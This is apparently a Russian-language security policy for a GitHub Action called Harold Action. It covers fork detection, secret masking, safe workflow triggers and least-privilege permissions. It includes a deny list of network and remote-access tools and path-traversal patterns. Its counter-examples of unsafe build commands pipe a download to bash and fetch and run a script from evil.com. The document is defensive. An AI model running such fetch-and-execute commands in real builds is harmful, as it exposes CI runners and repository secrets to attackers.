# Безопасность Harold Action

Этот документ описывает меры безопасности, реализованные в Harold Action, и рекомендации по безопасному использованию.

## Обзор мер безопасности

Harold Action реализует многоуровневую систему безопасности для защиты от потенциальных угроз при выполнении в различных контекстах, особенно при работе с fork репозиториями.

## Автоматические проверки безопасности

### 1. Определение контекста выполнения

Action автоматически определяет:
- Выполняется ли в fork репозитории
- Тип GitHub события (`pull_request` vs `pull_request_target`)
- Уровень прав доступа токена
- Доступность API для создания комментариев

### 2. Валидация входных параметров

Все входные параметры проходят строгую валидацию:

```bash
# Команды сборки проверяются на потенциально опасные операции
DANGEROUS_COMMANDS=(curl wget ssh scp rsync "git clone")

# Пути проверяются на попытки обхода директорий
INVALID_PATHS=(../ ../../ /etc /root /home)

# Пороговые значения проверяются на корректность формата
SIZE_THRESHOLD: должно быть положительным числом
PERCENTAGE_THRESHOLD: должно быть числом от 0 до 100
```

### 3. Маскирование секретов

Action автоматически маскирует:
- GitHub токены всех типов (`ghp_`, `gho_`, `ghu_`, `ghs_`, `ghr_`)
- Переменные окружения содержащие `TOKEN`, `SECRET`, `KEY`, `PASSWORD`
- Длинные строки в логах, которые могут быть секретами
- Содержимое чувствительных файлов (`.env`, `.npmrc`, etc.)

### 4. Ограничения для fork'ов

При выполнении в fork репозитории применяются дополнительные ограничения:

#### Запрещенные команды сборки:
- `curl`, `wget` - сетевые запросы
- `ssh`, `scp`, `rsync` - удаленный доступ
- `git clone` - клонирование репозиториев
- Команды с pipe операторами в небезопасных контекстах

#### Ограничения файловой системы:
- Максимальный размер конфигурационного файла: 10KB
- Запрет на обход директорий (`../`, абсолютные пути)
- Проверка на наличие чувствительных файлов

#### Ограничения API:
- Graceful fallback при отсутствии прав на комментарии
- Вывод результатов в логи вместо комментариев при необходимости

## Рекомендации по безопасному использованию

### Для владельцев репозиториев

#### 1. Выбор типа события

**Рекомендуется: `pull_request`**
```yaml
on:
  pull_request:
    types: [opened, synchronize, reopened]
```

**Плюсы:**
- Максимальная безопасность
- Код из fork'а выполняется в изолированном контексте
- Автоматическое применение ограничений

**Минусы:**
- Комментарии могут не создаваться в fork'ах

#### 2. Использование `pull_request_target` (для опытных пользователей)

```yaml
on:
  pull_request_target:
    types: [opened, synchronize, reopened]
```

**⚠️ ВНИМАНИЕ:** Используйте только если понимаете риски!

**Плюсы:**
- Комментарии работают в fork'ах
- Полный доступ к секретам репозитория

**Минусы:**
- Повышенные риски безопасности
- Код из fork'а выполняется с правами базового репозитория

**Обязательные меры при использовании `pull_request_target`:**

```yaml
jobs:
  analyze:
    runs-on: ubuntu-latest
    # КРИТИЧЕСКИ ВАЖНО: Ограничить права доступа
    permissions:
      contents: read
      pull-requests: write
      # НЕ ДАВАТЬ: actions: write, checks: write, deployments: write

    steps:
      # КРИТИЧЕСКИ ВАЖНО: Checkout только базовой ветки сначала
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.base.sha }}

      # Затем Harold Action с дополнительными проверками
      - uses: ./harold-action
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          # НЕ ПЕРЕДАВАТЬ другие секреты!
```

### 2. Настройка прав доступа

Минимально необходимые права:

```yaml
permissions:
  contents: read        # Для checkout кода
  pull-requests: write  # Для создания комментариев
  # issues: write       # Альтернатива для комментариев
```

### 3. Безопасные команды сборки

**✅ Безопасные команды:**
```yaml
build-command: 'npm run build'
build-command: 'yarn build'
build-command: 'pnpm build'
build-command: 'npm ci && npm run build:prod'
```

**❌ Небезопасные команды:**
```yaml
build-command: 'curl -s install.sh | bash'  # Загрузка и выполнение
build-command: 'wget https://evil.com/script.sh && chmod +x script.sh && ./script.sh'
build-command: 'ssh user@server "deploy.sh"'  # Удаленное выполнение
```

### Для контрибьюторов (fork'ов)

#### 1. Ожидаемые ограничения

При создании PR из fork'а ожидайте:
- Дополнительные проверки безопасности
- Возможные ограничения на создание комментариев
- Валидацию команд сборки и конфигураций

#### 2. Рекомендации

- Используйте стандартные команды сборки (`npm run build`)
- Избегайте кастомных скриптов с сетевыми операциями
- Держите конфигурационные файлы небольшими (< 10KB)
- Не включайте секреты в PR

## Обработка инцидентов безопасности

### Автоматическое реагирование

Action автоматически:
1. Прерывает выполнение при обнаружении угроз
2. Логирует подробности для анализа
3. Очищает временные файлы с потенциальными секретами
4. Маскирует чувствительную информацию в логах

### Мониторинг

Следите за следующими предупреждениями в логах:

```
::warning::Fork detected - some features may be limited for security
::warning::Limited write access detected - comments may not be posted
::error::Potentially unsafe build command detected in fork
::error::Configuration file too large in fork
```

### Сообщение об уязвимостях

Если вы обнаружили уязвимость в Harold Action:

1. **НЕ создавайте публичный issue**
2. Отправьте email на security@harold-action.dev
3. Включите подробное описание и шаги воспроизведения
4. Мы ответим в течение 48 часов

## Дополнительные ресурсы

- [GitHub Security Best Practices](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [Securing GitHub Actions](https://docs.github.com/en/actions/security-guides)
- [Harold Documentation](https://github.com/343dev/harold)

## История изменений безопасности

### v1.0.0
- Реализована базовая система безопасности
- Добавлено определение fork'ов
- Реализовано маскирование секретов
- Добавлена валидация входных параметров

---

**Помните:** Безопасность - это общая ответственность. Harold Action предоставляет инструменты, но правильная настройка и использование остается за вами.
